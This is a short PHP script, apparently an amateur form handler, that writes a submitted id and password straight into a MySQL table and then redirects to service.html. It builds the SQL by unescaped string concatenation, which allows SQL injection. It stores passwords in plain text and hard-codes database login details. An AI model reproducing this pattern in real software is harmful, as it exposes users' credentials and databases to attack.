<?php
session_start();
$connecterror = "unable to connect";
echo "hello1";
$cn=mysql_connect('mysql.parthhosting.com','u650000048_parth','9033578887','u650000048_parth') or die($connecterror);
echo "hello2";
if(!mysql_select_db('u650000048_parth',$cn))
{
	echo "Could not connect to database";
}

$q="insert into vakharia values('". $_REQUEST['id']."','". $_REQUEST['pwd']."')";
mysql_query($q,$cn);
header('Location: service.html');
?>	